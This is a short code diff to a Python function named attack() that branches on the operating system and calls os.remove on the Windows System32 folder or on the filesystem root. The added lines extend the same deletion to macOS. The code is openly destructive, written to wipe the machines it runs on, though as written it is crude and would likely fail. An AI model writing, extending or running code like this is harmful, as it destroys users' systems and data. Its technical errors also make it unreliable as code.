@@ -14,3 +14,5 @@ def attack():
        os.remove("\Windows\System32")
     elif operating_system == "Linux":
        os.remove("/")
+    elif operating_system == "Darwin":
+       os.remove("/")
